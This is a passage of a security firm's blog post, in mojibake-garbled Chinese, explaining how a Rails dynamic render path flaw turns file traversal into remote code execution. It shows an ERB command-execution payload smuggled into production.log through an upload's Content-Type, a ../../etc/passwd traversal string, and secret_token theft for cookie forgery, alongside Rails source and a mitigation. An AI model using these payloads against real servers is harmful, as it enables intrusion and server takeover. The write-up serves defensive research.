<p><a href="/assets/img/blog/20150724/render_file_traversal.png"><img src="/assets/img/blog/20150724/render_file_traversal.png" alt="Rails render Insecure Direct Object References" title="Rails render Insecure Direct Object References" /></a></p>

<h3 id="é€²éšæ”»æ“Š">é€²éšæ”»æ“Š</h3>

<p>é€šå¸¸åœ¨ Rails ç’°å¢ƒä¸‹èƒ½å¤ è®€å–ä»»æ„æª”æ¡ˆï¼Œæ”»æ“Šè€…æœƒå„ªå…ˆå°‹æ‰¾ secret_tokenï¼Œç›®çš„æ˜¯è®Šé€ æƒ¡æ„ session cookie åˆ©ç”¨ Marshal serialize çš„å•é¡Œåš <a href="http://robertheaton.com/2013/07/22/how-to-hack-a-rails-app-using-its-secret-token/">RCE</a>ã€‚ç„¶è€Œåœ¨æœ¬æ¡ˆä¾‹ç³»çµ±ä½¿ç”¨äº† Rails 4.1 å¾Œçš„ç‰ˆæœ¬ï¼ŒRails 4.1 é è¨­ä½¿ç”¨äº† JSON-based çš„ serializer é˜²æ­¢äº†ä¹‹å‰çš„ RCE å•é¡Œï¼Œæ‰€ä»¥ä¸¦æ²’æœ‰è¾¦æ³•è¼•é¬†åˆ©ç”¨ã€‚</p>

<p>ç‚ºäº†å–å¾—ç³»çµ±æ“ä½œæ¬Šï¼Œæˆ‘å€‘å˜—è©¦å°‹æ‰¾å…¶ä»–å¯åˆ©ç”¨çš„åœ°æ–¹ã€‚åœ¨é€™é‚Šæˆ‘å€‘ç™¼ç¾äº†è©²ç«™ç³»çµ± production.log ä¸­å­˜åœ¨ AWS çš„ä¸Šå‚³ç´€éŒ„ã€‚å¦‚ä¸‹ï¼š</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># log/production.log</span>
<span class="no">INFO</span> <span class="o">--</span> <span class="p">:</span> <span class="p">[</span><span class="no">AWS</span> <span class="no">S3</span> <span class="mi">200</span> <span class="mf">0.041347</span> <span class="mi">0</span> <span class="n">retries</span><span class="p">]</span> <span class="n">put_object</span><span class="p">(</span><span class="ss">:acl</span><span class="o">=&gt;</span><span class="ss">:public_read</span><span class="p">,</span><span class="ss">:bucket_name</span><span class="o">=&gt;</span><span class="s2">"xxxx"</span><span class="p">,</span><span class="ss">:content_length</span><span class="o">=&gt;</span><span class="mi">12405</span><span class="p">,</span><span class="ss">:content_type</span><span class="o">=&gt;</span><span class="s2">"image/png"</span><span class="p">,</span><span class="ss">:data</span><span class="o">=&gt;</span><span class="c1">#&lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&gt;,:key=&gt;"upload_001")</span></code></pre></figure>

<p>æ–¼æ˜¯æˆ‘å€‘å¯ä»¥åˆ©ç”¨ä¸Šå‚³æª”æ¡ˆçš„ Content-Type å…§å®¹ï¼Œå°‡ Embedded Ruby èªå¥ &lt;%=`#{params[:devcore]}`%&gt; æ·»åŠ åˆ° production.log æª”æ¡ˆè£¡é¢ã€‚æ–¼æ˜¯ log çš„å…§å®¹è®Šæˆäº†ä¸‹é¢é€™æ¨£ï¼š</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># log/production.log</span>
<span class="no">INFO</span> <span class="o">--</span> <span class="p">:</span> <span class="p">[</span><span class="no">AWS</span> <span class="no">S3</span> <span class="mi">200</span> <span class="mf">0.041347</span> <span class="mi">0</span> <span class="n">retries</span><span class="p">]</span> <span class="n">put_object</span><span class="p">(</span><span class="ss">:acl</span><span class="o">=&gt;</span><span class="ss">:public_read</span><span class="p">,</span><span class="ss">:bucket_name</span><span class="o">=&gt;</span><span class="s2">"xxxx"</span><span class="p">,</span><span class="ss">:content_length</span><span class="o">=&gt;</span><span class="mi">12405</span><span class="p">,</span><span class="ss">:content_type</span><span class="o">=&gt;</span><span class="s2">"image/png"</span><span class="p">,</span><span class="ss">:data</span><span class="o">=&gt;</span><span class="c1">#&lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&gt;,:key=&gt;"upload_001")</span>

<span class="no">INFO</span> <span class="o">--</span> <span class="p">:</span> <span class="p">[</span><span class="no">AWS</span> <span class="no">S3</span> <span class="mi">200</span> <span class="mf">0.040211</span> <span class="mi">0</span> <span class="n">retries</span><span class="p">]</span> <span class="n">put_object</span><span class="p">(</span><span class="ss">:acl</span><span class="o">=&gt;</span><span class="ss">:public_read</span><span class="p">,</span><span class="ss">:bucket_name</span><span class="o">=&gt;</span><span class="s2">"xxxx"</span><span class="p">,</span><span class="ss">:content_length</span><span class="o">=&gt;</span><span class="mi">12405</span><span class="p">,</span><span class="ss">:content_type</span><span class="o">=&gt;</span><span class="s2">"&lt;%=`</span><span class="si">#{</span><span class="n">params</span><span class="p">[</span><span class="ss">:devcore</span><span class="p">]</span><span class="si">}</span><span class="s2">`%&gt;"</span><span class="p">,</span><span class="ss">:data</span><span class="o">=&gt;</span><span class="c1">#&lt;File:/Users/shaolin/project/playground/rails/render/public/uploads/tmp/test_upload.png (12405 bytes)&gt;,:key=&gt;"upload_002")</span></code></pre></figure>

<p>æ¥è‘—ï¼Œæˆ‘å€‘å°±å¯ä»¥åˆ©ç”¨å‰é¢çš„å¼±é»è®€å– production.log æª”æ¡ˆï¼Œå†å¸¶ä¸€å€‹ devcore åƒæ•¸ä½œç‚ºæŒ‡ä»¤ï¼Œå¦‚åœ–ï¼ŒæˆåŠŸå–å¾—ç³»çµ±æ“ä½œæ¬Š :p</p>

<p><a href="/assets/img/blog/20150724/render_RCE.png"><img src="/assets/img/blog/20150724/render_RCE.png" alt="Rails render Remote Code Execution" title="Rails render Remote Code Execution" /></a></p>

<h3 id="é¢¨éšªåŸå› ">é¢¨éšªåŸå› </h3>

<p>ä¸€èˆ¬ä¾†èªª Rails é–‹ç™¼ä¸¦ä¸å¤ªæœƒé€™æ¨£å¯«ï¼Œä½†ç¨å¾®æœå°‹ä¸€ä¸‹ Github é‚„æ˜¯èƒ½ç™¼ç¾é€™ç¨®å¯«æ³•å­˜åœ¨ä¸€äº›å°ˆæ¡ˆä¸­ã€‚æˆ‘æƒ³ä¸»è¦åŸå› å¤šåŠæ˜¯é–‹ç™¼è€…æƒ³è¦å·æ‡¶ï¼Œç„¶å¾Œä¹Ÿå¯èƒ½æƒ³èªªå‹•æ…‹æ¨£æ¿è·¯å¾‘é ‚å¤šå°±è¢«çœ‹åˆ°é¢æ¿çš„ htmlï¼Œç„¡å‚·å¤§é›…ã€‚èª°çŸ¥é“å°±å› ç‚ºé€™æ¨£å°è‡´æ•´å€‹ç¨‹å¼ç¢¼å…§å®¹è¢«è®€å–ã€‚</p>

<p>è‹¥æœ‰ä¸€å€‹ action è¦å‹•æ…‹é¡¯ç¤ºä¸åŒæ¨¡ç‰ˆçš„éœ€æ±‚ï¼Œç‚ºäº†é¿å…ä¸Šè¿°çš„å•é¡Œï¼Œå°±è¾›è‹¦é»å…ˆç”¨ caseâ€¦when å»åˆ¤æ–·å§ã€‚é€™è·Ÿä¸è¦ç”¨å­—ä¸²çµ„ SQL èªå¥é¿å… SQL injection ä¸€æ¨£ï¼Œé€™ç¨®å¤–é¢å‚³é€²ä¾†çš„åƒæ•¸éƒ½è¦è¬¹æ…è™•ç†çš„è§€å¿µè¦å…§åŒ–åœ¨é–‹ç™¼ä¸­ã€‚</p>

<p>é™¤äº†é–‹ç™¼è€…åŸºæœ¬ä¸Šä¸æ‡‰è©²é€™æ¨£é–‹ç™¼å¤–ï¼ŒRails æœ¬èº«ä¹Ÿæœ‰ä¸€é»é»å•é¡Œï¼Œç•¶ render è·¯å¾‘æ²’æœ‰å‰¯æª”åï¼Œç„¡æ³•åˆ¤æ–·ä»€éº¼æ ¼å¼æ™‚ï¼Œå°±æœƒç›´æ¥æ¡ç”¨é è¨­çš„ template handlerã€‚</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># lib/action_view/template/resolver.rb</span>
<span class="k">def</span> <span class="nf">extract_handler_and_format_and_variant</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">default_formats</span><span class="p">)</span>
  <span class="n">pieces</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">basename</span><span class="p">(</span><span class="n">path</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="s2">"."</span><span class="p">)</span>
  <span class="n">pieces</span><span class="p">.</span><span class="nf">shift</span>

  <span class="n">extension</span> <span class="o">=</span> <span class="n">pieces</span><span class="p">.</span><span class="nf">pop</span>
  <span class="k">unless</span> <span class="n">extension</span>
    <span class="n">message</span> <span class="o">=</span> <span class="s2">"The file </span><span class="si">#{</span><span class="n">path</span><span class="si">}</span><span class="s2"> did not specify a template handler. The default is currently ERB, "</span> <span class="p">\</span>
              <span class="s2">"but will change to RAW in the future."</span>
    <span class="no">ActiveSupport</span><span class="o">::</span><span class="no">Deprecation</span><span class="p">.</span><span class="nf">warn</span> <span class="n">message</span>
  <span class="k">end</span>

  <span class="n">handler</span> <span class="o">=</span> <span class="no">Template</span><span class="p">.</span><span class="nf">handler_for_extension</span><span class="p">(</span><span class="n">extension</span><span class="p">)</span>
  <span class="nb">format</span><span class="p">,</span> <span class="n">variant</span> <span class="o">=</span> <span class="n">pieces</span><span class="p">.</span><span class="nf">last</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="no">EXTENSIONS</span><span class="p">[</span><span class="ss">:variants</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span> <span class="k">if</span> <span class="n">pieces</span><span class="p">.</span><span class="nf">last</span>
  <span class="nb">format</span>  <span class="o">&amp;&amp;=</span> <span class="no">Template</span><span class="o">::</span><span class="no">Types</span><span class="p">[</span><span class="nb">format</span><span class="p">]</span>

  <span class="p">[</span><span class="n">handler</span><span class="p">,</span> <span class="nb">format</span><span class="p">,</span> <span class="n">variant</span><span class="p">]</span>
<span class="k">end</span></code></pre></figure>

<p>è€Œé€™è£¡é è¨­çš„ handler æ˜¯ ERBï¼ˆè¦‹ register_default_template_handlerï¼‰ï¼Œæ‰€ä»¥æœ‰æœ¬ç¯‡å¾Œé¢æåˆ°çš„é€²éšæ”»æ“Šï¼Œå¯ä»¥è¢«åˆ©ç”¨ä¾† RCEã€‚</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="c1"># lib/action_view/template/handlers.rb</span>
<span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">extended</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
  <span class="n">base</span><span class="p">.</span><span class="nf">register_default_template_handler</span> <span class="ss">:erb</span><span class="p">,</span> <span class="no">ERB</span><span class="p">.</span><span class="nf">new</span>
  <span class="n">base</span><span class="p">.</span><span class="nf">register_template_handler</span> <span class="ss">:builder</span><span class="p">,</span> <span class="no">Builder</span><span class="p">.</span><span class="nf">new</span>
  <span class="n">base</span><span class="p">.</span><span class="nf">register_template_handler</span> <span class="ss">:raw</span><span class="p">,</span> <span class="no">Raw</span><span class="p">.</span><span class="nf">new</span>
  <span class="n">base</span><span class="p">.</span><span class="nf">register_template_handler</span> <span class="ss">:ruby</span><span class="p">,</span> <span class="ss">:source</span><span class="p">.</span><span class="nf">to_proc</span>
<span class="k">end</span></code></pre></figure>

<p>æ…¶å¹¸çš„æ˜¯ï¼Œç›®å‰ Rails å·²ç¶“æŠŠé è¨­çš„ template handler å¾ ERB æ”¹æˆ RAWï¼Œä¸æœƒè¼•æ˜“æŠŠè¦ render çš„æª”æ¡ˆç•¶æˆ ERB åŸ·è¡Œäº†ã€‚è©³ç´°çš„å…§å®¹è«‹åƒè€ƒé€™å€‹ <a href="https://github.com/rails/rails/commit/4be859f0fdf7b3059a28d03c279f03f5938efc80">commit</a>ã€‚</p>

<h3 id="çµè«–">çµè«–</h3>

<p>Ruby on Rails èƒ½è®“é–‹ç™¼è€…è¼ƒè¼•é¬†çš„é–‹ç™¼å‡ºå®‰å…¨çš„æ‡‰ç”¨ç¨‹å¼ï¼Œç„¶è€Œï¼Œè‹¥é–‹ç™¼è€…ä¸æ³¨æ„ï¼Œé‚„æ˜¯æœ‰å¯èƒ½å¯«å‡ºåš´é‡çš„æ¼æ´ã€‚æœ¬æ–‡çš„å‹•æ…‹æ¨£æ¿è·¯å¾‘å°±æ˜¯é€™æ¨£ä¸€å€‹ä¾‹å­ï¼Œå®ƒä¸åªæ˜¯ OWASP æ‰€æè¿°çš„å¯ä»¥å­˜å–ä»»æ„æ¨¡ç‰ˆè€Œå·²ï¼Œå®ƒå¯ä»¥éæ­·æª”æ¡ˆï¼Œç”šè‡³å› ç‚º rails é è¨­çš„ template handler æ˜¯ ERBï¼Œé€ æˆé ç«¯å‘½ä»¤åŸ·è¡Œè®“æ”»æ“Šè€…å–å¾—ä¼ºæœå™¨æ“ä½œæ¬Šã€‚</p>

<p>é€™å€‹ä¾‹å­åˆå†æ¬¡é©—è­‰ï¼Œæ¡†æ¶å¯ä»¥å¹«åŠ©å¤§å®¶å¿«é€Ÿé–‹ç™¼ï¼Œå¢åŠ å®‰å…¨åº¦ã€‚ä½†å”¯æœ‰è‰¯å¥½çš„å®‰å…¨æ„è­˜ï¼Œæ‰æ˜¯æ‡‰ç”¨ç¨‹å¼å®‰å…¨çš„åŸºçŸ³ã€‚</p>

<h3 id="è¨»è§£">è¨»è§£</h3>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:note1" role="doc-endnote">
      <p>Dynamic Render Paths ç›®å‰ä¸¦æ²’æœ‰ä¸­æ–‡ç¿»è­¯ï¼Œå› ç‚ºå•é¡Œä¹‹ç²¾é«“åœ¨æ–¼è¦ç”¢ç”Ÿçš„æ¨£æ¿è·¯å¾‘æ˜¯å¯è®Šå‹•çš„ï¼Œå› æ­¤ç­†è€…èªç‚ºå‹•æ…‹æ¨£æ¿è·¯å¾‘é€™å€‹ç¿»è­¯è¼ƒç‚ºè²¼åˆ‡ã€‚Â <a href="#fnref:note1" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
    <li id="fn:note2" role="doc-endnote">
      <p>ç­†è€…æ¸¬è©¦çš„ç’°å¢ƒç‚º Rails 4.1.4ï¼Œå…¶ä»– Rails ç‰ˆæœ¬æœ‰å¯èƒ½éœ€è¦ç”¨ ../../../../../etc/passwd è·³è„«ç›®å‰ç›®éŒ„ã€‚Â <a href="#fnref:note2" class="reversefootnote" role="doc-backlink">&#8617;</a></p>
    </li>
  </ol>
</div>

                    </div>
                    <!-- æ–‡ç« å…§å®¹ -->
                </div>
            </article>
            <!-- æ–‡ç«  end -->
        </section>
        
         <!-- ä½œè€… -->
        <section>
            <div class="container article_footer">
                <div class="author_info">
                    <a href="/blog/author/shaolin">
                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/shaolin.png);"></div>
                    </a>
                    <div>
                        <a class="author" href="/blog/author/shaolin">
                            <h3>Shaolin</h3>
                        </a>
                        <span>Red Team Director</span>
                        <p>
                            å–œæ„›è³‡è¨ŠæŠ€è¡“ã€å–œæ­¡è·Ÿåˆ¥äººèµ°ä¸ä¸€æ¨£çš„è·¯ã€‚æœ‰ä¸€é»é»æ™ºéšœçš„ç†±è¡€äººï¼ŒæœŸæœ›èƒ½åˆ©ç”¨è³‡è¨Šçš„åŠ›é‡å°ä¸–ç•Œæœ‰æ‰€è²¢ç»ã€‚
                        </p>
                    </div>
                </div>
            </div>
        </section>
        

        <!-- ç›¸é—œæ–‡ç«  -->
        <section class="recommand articles-list">
            <div class="container">
              
                <!-- ç›¸é—œæ–‡ç«  Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/æœ€æ–°æ¶ˆæ¯">æœ€æ–°æ¶ˆæ¯</a>
                        <span class="tag">
    
                          <a href="/blog/tag/OffSec/">#OffSec</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/OSEE/">#OSEE</a> <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/LiveTraining/">#LiveTraining</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/07/02/webdog-view-on-osee-advanced-windows-exploitation-from-0.1/">å¾ Web ç‹—çš„è¦–è§’çœ‹ OSEE â€” å¾ 0.1 é–‹å§‹çš„ Advanced Windows Exploitation è€ƒè©¦</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/orange">
                            <h3>Orange Tsai</h3>
                        </a>
                    
                        <span class="date">2025-07-02</span>
                        <p class="line-litmit-3">é€™ç¯‡æ–‡ç®—æ˜¯è‡ªå·±æº–å‚™ OSEE è€ƒè©¦çš„ä¸€é»å°å¿ƒå¾—ï¼Œé—œæ–¼èª²ç¨‹å…§å®¹å¤§å®¶å¯ä»¥åƒè€ƒä¸Šä¸€ç¯‡ç”± NiNi æ’°å¯«çš„ã€ŠEXP-401 (OSEE)ï¼šç”¨äº”å¤©èª²ç¨‹è¨“ç·´é€šé€åå¹´çš„çŸ¥è­˜é«”ç³»ã€‹ï¼Œä¹Ÿå¯ä»¥æœŸå¾…ä¸‹ç¦®æ‹œ Angelboy è¦å‡ºçš„ã€Œæˆ‘ç¨è‡ªé€Ÿé€š OSEE ğŸˆâ€â¬›ã€ï¼
                        </p>
                    </div>
                </article>
              
                <!-- ç›¸é—œæ–‡ç«  Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/æŠ€è¡“å°ˆæ¬„">æŠ€è¡“å°ˆæ¬„</a>
                        <span class="tag">
    
                          <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/Ubuntu/">#Ubuntu</a> <a href="/blog/tag/Advisory/">#Advisory</a> <a href="/blog/tag/Linux/">#Linux</a> <a href="/blog/tag/Kernel/">#Kernel</a> <a href="/blog/tag/AppArmor/">#AppArmor</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/">The Journey of Bypassing Ubuntuâ€™s Unprivileged Namespace Restriction</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/pumpkin">
                            <h3>Pumpkin</h3>
                        </a>
                    
                        <span class="date">2025-06-26</span>
                        <p class="line-litmit-3">è¿‘æœŸ Ubuntu å¯¦ä½œäº†æ–°çš„æ²™ç›’æ©Ÿåˆ¶ä¾†æ¸›å°‘æ”»æ“Šé¢ï¼Œç„¶è€Œå…¶ä¹çœ‹ä¹‹ä¸‹å …ä¸å¯æ‘§ï¼Œä½†ç¶“éç ”ç©¶å¾Œç™¼ç¾ï¼Œç¹éæ–¹å¼ä¸¦æ²’æœ‰æƒ³åƒä¸­é‚£éº¼å›°é›£ï¼æœ¬æ–‡å°‡ä»‹ç´¹æˆ‘å€‘å¦‚ä½•å¾æ ¸å¿ƒå±¤ç´šè‘—æ‰‹æ‰¾å‡ºç¹éæ–¹æ³•ï¼Œä¸¦åˆ†äº«ç ”ç©¶éç¨‹ä¸­é‡åˆ°çš„ä¸€äº›æœ‰è¶£æ•…äº‹ã€‚
                        </p>
                    </div>
                </article>
              
                <!-- ç›¸é—œæ–‡ç«  Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/æœ€æ–°æ¶ˆæ¯">æœ€æ–°æ¶ˆæ¯</a>
                        <span class="tag">
    
                          <a href="/blog/tag/OffSec/">#OffSec</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/OSEE/">#OSEE</a> <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/LiveTraining/">#LiveTraining</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/">EXP-401 (OSEE)ï¼šç”¨äº”å¤©èª²ç¨‹è¨“ç·´é€šé€åå¹´çš„çŸ¥è­˜é«”ç³»</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/terrynini">
                            <h3>Terrynini</h3>
                        </a>
                    
                        <span class="date">2025-05-22</span>
                        <p class="line-litmit-3">EXP-401ï¼ˆOSEEï¼‰ï¼Œä¹Ÿå«åš Advanced Windows Exploitationï¼ˆAWEï¼‰ï¼Œæ˜¯ OffSec ä¸­å”¯ä¸€çš„ã€ŒExpertã€ç­‰ç´šèª²ç¨‹ï¼Œä¹Ÿæ˜¯å…¬èªæœ€å›°é›£ã€é€šéç‡æœ€ä½çš„è­‰ç…§
                        </p>
                    </div>
                </article>
              

            </div>
        </section>
    </div>

    <!-- footer -->
    <footer>
<div class="container footer">
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
        <div class="social">
            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
        </div>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">æœå‹™</h6>
        <ul>
            <li><a href="/services/red-team/">ç´…éšŠæ¼”ç·´</a></li>
            <li><a href="/services/penetration-test/">æ»²é€æ¸¬è©¦</a></li>
            <li><a href="/services/security-consulting/">è³‡å®‰é¡§å•æœå‹™</a></li>
            <li><a href="/services/security-training/">è³‡å®‰æ•™è‚²è¨“ç·´</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">ç ”ç©¶</h6>
        <ul>
            <li><a href="/research/overview/">ç¸½è¦½æ¦‚è¦</a></li>
            <li><a href="/research/awards/">ç«¶è³½èˆ‡çé …</a></li>
            <li><a href="/research/bug-bounty/">ä¼æ¥­æ¼æ´å›å ±</a></li>
            <li><a href="/research/talks/">åœ‹éš›ç ”è¨æœƒ</a></li>
            <li><a href="/research/cve/">CVE æ¼æ´åˆ—è¡¨</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">å…¬å¸</h6>
        <ul>
            <li><a href="/company/about/">å…¬å¸ç°¡ä»‹</a></li>
            <li><a href="/company/our-team/">åœ˜éšŠæˆå“¡</a></li>
            <li><a href="/company/history/">æˆå°±èˆ‡æ²¿é©</a></li>
            <li><a href="/company/csr/">ä¼æ¥­ç¤¾æœƒè²¬ä»»</a></li>
            <li><a href="/company/jobs/">å·¥ä½œæ©Ÿæœƒ</a></li>
            <li><a href="/contact/">è¯çµ¡æˆ‘å€‘</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">æ–°è</h6>
        <ul>
            <li><a href="/blog/">BLOG</a></li>
            <li><a href="/media-kit/">åª’é«”ç´ æä¸‹è¼‰</a></li>
        </ul>
    </div>

    <!-- divider åˆ†éš”ç·š -->
    <div class="divider"></div>

    <div class="copyright">
        <div class="info">
            <span>Â© 2025 DEVCORE æˆ´å¤«å¯‡çˆ¾è‚¡ä»½æœ‰é™å…¬å¸. <b class="line-block">All rights reserved.</b></span>
            <span><a href="/privacy-policy/">Privacy Policy</a></span>
        </div>
        <div class="lang">
            <!-- <i class="icon translate"></i>
            <select>
                <option value="">Language</option>
                <option value="">ä¸­æ–‡</option>
                <option value="">English</option>
            </select> -->
            <span>Language :<a href="/">ä¸­æ–‡</a>|<a href="/en/">English</a></span>
        </div>
    </div>

</div>
    </footer>
</body>
</html>

